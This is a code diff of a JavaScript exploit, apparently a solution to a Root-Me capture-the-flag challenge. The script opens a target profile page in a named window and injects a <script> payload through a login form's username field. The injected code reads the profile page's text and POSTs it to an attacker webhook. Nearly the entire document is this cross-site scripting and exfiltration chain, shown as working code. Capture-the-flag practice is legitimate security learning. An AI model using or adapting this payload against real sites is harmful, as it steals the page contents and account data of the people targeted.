@@ -6,45 +6,31 @@ const OPEN = "rootme";
 
 function get(url) {
   let xhr = new XMLHttpRequest();
-  xhr.open("GET", url, false);
+  xhr.open("GET", url, true);
   return xhr.send(null);
 }
 
 function post(url, data) {
   let xhr = new XMLHttpRequest();
-  xhr.open("POST", url, false);
+  xhr.open("POST", url, true);
   return xhr.send(data);
 }
 
-function imgEnd() {
+function openProfile() {
   const o = window.open(PROFILE, "toto");
   post(`${WEBHOOK}?end`, o);
   // document.location.href = WEBHOOK;
 }
 
-// const queryString = window.location.search;
-// const urlParams = new URLSearchParams(queryString);
-// const id = urlParams.get("id");
+window.open(PROFILE, OPEN);
 
-try {
-  window.open(PROFILE, OPEN);
-
-  const payload = `
-try {
-  const profile = window.open("", "${OPEN}");
-  let xhr = new XMLHttpRequest();
-  xhr.open("POST", "${WEBHOOK}", false);
-  xhr.send(profile);
-} catch (error) {
-  let xhr = new XMLHttpRequest();
-  xhr.open("POST", "${WEBHOOK}", false);
-  xhr.send(error);
-}
+const payload = `
+const profile = window.open("", "${OPEN}");
+let xhr = new XMLHttpRequest();
+xhr.open("POST", "${WEBHOOK}", true);
+xhr.send(profile.document.body.innerText);
 `;
-  document.getElementById("username").value = `<script>${payload}</script>`;
-  document.getElementById("login").submit();
+document.getElementById("username").value = `<script>${payload}</script>`;
+document.getElementById("login").submit();
 
-  setTimeout(() => imgEnd(), 3000);
-} catch (error) {
-  post(WEBHOOK, `Error: ${error}`);
-}
+setTimeout(() => openProfile(), 3000);
